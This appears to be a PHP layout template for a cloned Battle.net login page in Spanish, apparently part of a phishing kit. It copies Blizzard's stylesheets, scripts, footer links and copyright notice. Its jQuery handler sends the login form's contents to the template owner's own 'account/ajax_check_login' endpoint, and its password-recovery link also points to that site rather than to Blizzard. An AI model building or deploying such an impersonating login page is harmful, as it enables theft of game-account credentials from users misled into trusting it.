<!DOCTYPE html>
<?php if($enable_rtl) : ?>
<html dir="rtl">
<?php else : ?>
<html lang="es-ES">
<?php endif; ?>
<head>
    <meta http-equiv="imagetoolbar" content="false" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title><?php if(isset($page_title)) : ?><?php echo $page_title ?> - <?php endif; ?><?php echo $this->settings->info->site_name ?></title>         
    <meta charset="UTF-8" />
    <link rel="shortcut icon" href="//bnetus-a.akamaihd.net/login/static/images/meta/favicon.0gxnz.ico" />
    <script nonce="yHLwp0zGQ3" type="text/javascript">
        var BlzCookieConsent = {
            host: 'battle.net',
            onetrustScriptUrl: '',
            whitelistedCookies: ['']
        }
    </script>
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/gdpr/cookie-consent-filter-compat.29RI2.js?v=58-1"></script>
    <!--[if gt IE 8]><!-->
    <link rel="stylesheet" type="text/css" media="all" href="//bnetus-a.akamaihd.net/login/static/css/toolkit/blizzard-web.min.4SuhJ.css" />
    <!-- <![endif]-->
    <!--[if IE 8]><link rel="stylesheet" type="text/css" media="all" href="/login/static/css/toolkit/blizzard-web-ie8.min.css?v=58-1" /><![endif]-->
    <link rel="stylesheet" type="text/css" media="all" href="//bnetus-a.akamaihd.net/login/static/css/login/global.min.2jMuS.css?v=1" />
    <link rel="stylesheet" type="text/css" media="all" href="//bnetus-a.akamaihd.net/login/static/css/nav-client/nav-client.26C4w.css" />
    <link rel="stylesheet" type="text/css" media="(max-width:800px)" href="//bnetus-a.akamaihd.net/login/static/css/nav-client/nav-client-responsive.2L8V6.css" />
    <!--[if IE 8]>
	<link rel="stylesheet" type="text/css" media="all" href="//bnetus-a.akamaihd.net/login/static/css/login/ie8.1GXdy.css" />
	<![endif]-->
    <link rel="search" type="application/opensearchdescription+xml" href="https://us.battle.net/es-es/data/opensearch" title="Búsqueda en Blizzard" />
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/toolkit/third-party/jquery/jquery-1.11.0.min.1UgDG.js?v=58-1"></script>
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/toolkit/toolkit.min.3Crdu.js?v=58-1"></script>
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/core.min.26Ucq.js?v=58-1"></script>
    <meta name="viewport" content="width=device-width" />
    <!-- CODE INCLUDES -->
    <?php echo $cssincludes ?>
    <!-- SCRIPTS -->
    <script type="text/javascript">
    var global_base_url = "<?php echo site_url('/') ?>";
    var global_hash = "<?php echo $this->security->get_csrf_hash() ?>";
    </script>
</head>

<body class="us es-es login-template web blizzard" data-embedded-state="STATE_LOGIN" data-baseUrl="<?php echo site_url('/account/login'); ?>" data-cdnUrl="http://media.blizzard.com" data-staticUrl="/login/static" data-sharedStaticUrl="/login/static/local-common" data-secureSupportUrl="https://us.battle.net/support/" data-project="login" data-projectUrl="/login" data-locale="es-es" data-language="es" data-region="us" data-loggedIn="false" data-userAgent="web" data-tagManagerAccount="GTM-589KTQ" data-gtmDataLayer="[{'userAgent':'web','analyticsRequestUri':'/login/es-es/','theme':'blizzard','errorCode':'','state':'STATE_LOGIN'}]" data-nonce="yHLwp0zGQ3" data-network-error-message="Por favor, comprueba tu conexión y vuelve a intentarlo.">
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/login/analytics.min.1HAsh.js?v=58-1"></script>
    <div class="grid-container wrapper">
        <?php echo $content; ?>
        <img src="//bnetus-a.akamaihd.net/login/static/images/toolkit/themes/bnet/icons/sprite-24-red.0PPlX.png" class="hide" />
        <img src="//bnetus-a.akamaihd.net/login/static/images/toolkit/themes/bnet/spinners/spinner-battlenet.1IdwV.png" class="hide" />
        <footer id="footer" class="footer es-es">
            <div id="nav-client-footer" class="nav-client">
                <div class="mobileFooterEnabled footer-content footer-desktop grid-container">
                    <div class="nav-section support-feedback">
                        <div class="nav-left">
                            <div id="nav-feedback">
                            </div>
                        </div>
                    </div>
                    <div class="nav-section">
                        <div class="nav-left nav-logo-group">
                            <div class="footer-links nav-left">
                                <a class="nav-item nav-a" href="https://us.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Contrato de Licencia de Usuario Final de Battle.net</a>
                                <span>|</span>
                                <a class="nav-item nav-a" href="https://us.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacidad</a>
                                <span>|</span>
                                <a class="nav-item nav-a" href="https://www.blizzard.com/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Términos</a>
                                <span>|</span>
                                <a class="nav-item nav-a" href="https://us.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Derechos de autor</a>
                                <span>|</span>
                                <a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">Cookies</a>
                                <div class="copyright"></div>
                                <div class="nav-footer-icon-container">
                                    <ul class="nav-footer-icon-list">
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="nav-ratings">
                        </div>
                    </div>
                </div>
                <div class="mobileFooterEnabled footer-content footer-mobile grid-container">
                    <div class="nav-logo-group">
                        <div class="footer-links">
                            <a class="nav-item nav-a" href="https://us.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Contrato de Licencia de Usuario Final de Battle.net</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://us.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Privacidad</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://www.blizzard.com/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Términos</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="https://us.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Derechos de autor</a>
                            <span>|</span>
                            <a class="nav-item nav-a" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">Cookies</a>
                        </div>
                        <div class="copyright">©2020 Blizzard Entertainment, Inc. Todos los derechos reservados.</div>
                        <div class="nav-footer-icon-container">
                            <ul class="nav-footer-icon-list">
                            </ul>
                        </div>
                        <div class="nav-ratings">
                        </div>
                    </div>
                </div>
            </div>
        </footer>
    </div>
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/embedded-javascript/embed-0.1.5.min.2QnZN.js?v=58-1"></script>
    <script type="text/javascript" src="//bnetus-a.akamaihd.net/login/static/js/login/global.min.3LqgD.js"></script>
    <script type="text/javascript">
  $(document).ready(function() {
    var form = "login_form";
    $('#'+form + ' input').on("focus", function(e) {
      clearerrors();
    });
    $('#'+form).on("submit", function(e) {
      e.preventDefault();
      // Ajax check
      var data = $(this).serialize();
      
      $.ajax({
        url : "<?php echo site_url('account/ajax_check_login'); ?>",
        type : 'POST',
        data : {
          formData : data, '<?php echo $this->security->get_csrf_token_name(); ?>' : '<?php echo $this->security->get_csrf_hash() ?>'
        },
        dataType: 'JSON',
        success: function(data) {
            
          if(data.error) {
            $('#'+form).prepend('<div id="display-errors" class="alert alert-error alert-icon">'+data.error_msg+'<br><a href="<?php echo site_url('account/recovery/identify-account.html'); ?>">¿Has olvidado tu contraseña?</a></div>');
          }
          if(data.success) {
            // allow form submit
            $('#'+form+ ' input[type="submit"]').val("Logging In ...");
            $('#'+form).unbind('submit').submit();
          }
          if(data.field_errors) {
            var errors = data.fieldErrors;
            console.log(errors);
            for (var property in errors) {
                if (errors.hasOwnProperty(property)) {
                    // Find form name
                    var field_name = '#' + form + ' input[name="'+property+'"]';
                    $(field_name).addClass("errorField");
                    // Get input group of field
                    $('#'+form).prepend('<div class="form-error">'+errors[property]+'</div>');
                    

                }
            }
          }
        }
        
      });

      return false;

      console.log('ingreso');

    });
  });

    function clearerrors() 
    {
        console.log("Called");
        $('.form-error').remove();
        $('.errorField').removeClass('errorField');
    }

    function accept_cookie() {
        $.ajax({
            url: '<?php echo site_url('account/accept_cookie'); ?>',
            data: {
                hash : global_hash
            },
            success: function(msg) {
                $('#cookie-consent').fadeOut(100);
            }
        });
    }
</script>
<?php echo $jsincludes ?> 
</body>

</html>